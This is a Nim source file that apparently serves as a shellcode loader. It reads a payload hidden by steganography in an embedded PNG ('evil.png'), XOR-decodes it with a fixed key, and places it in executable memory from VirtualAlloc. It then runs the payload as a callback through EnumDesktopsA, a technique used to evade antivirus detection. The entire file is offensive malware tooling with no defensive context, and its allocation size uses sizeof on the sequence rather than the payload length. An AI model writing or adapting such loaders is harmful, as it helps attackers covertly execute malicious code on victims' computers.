import winim
import pixie, steganography

const imageStr = staticRead("enc_windows.png")

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc xorDecode(buf: var seq[byte], key: int) =
  for i in buf.low .. buf.high:
    buf[i] = buf[i] xor key.byte

proc main() = 
  writeFile("./evil.png", imageStr)
  var imageName = "evil.png"
  var image = readImage(imageName)
  var key = 7
  var buf = decodeMessage(image).toByteSeq()
  buf.xorDecode(key)

  var p = VirtualAlloc(NULL, sizeof(buf).DWORD, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  for i in buf.low .. buf.high:
    copyMem(p, addr buf[i], 1)
    p = cast[LPVOID](cast[int](p) + 1) 
  p = cast[LPVOID](cast[int](p) - buf.len) 
  EnumDesktopsA(GetProcessWindowStation(), cast[DESKTOPENUMPROCA](p), cast[LPARAM](NULL))


when isMainModule:
  main()